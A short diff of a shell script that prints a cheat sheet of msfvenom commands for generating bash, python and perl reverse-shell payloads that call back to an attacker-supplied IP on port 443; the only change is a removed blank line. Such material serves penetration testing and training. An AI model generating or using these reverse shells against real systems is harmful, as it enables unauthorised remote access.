@@ -42,4 +42,3 @@ echo -e "${Frame}###${End} ${Title}Script Language payloads${End} ${Frame}###${E
 echo -e "${Point} msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=443 -f raw -o reverse.sh ${Comment}# bash${End}"
 echo -e "${Point} msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=443 -f raw -o reverse.py ${Comment}# python${End}"
 echo -e "${Point} msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=443 -f raw -o reverse.pl ${Comment}# perl${End}"
-
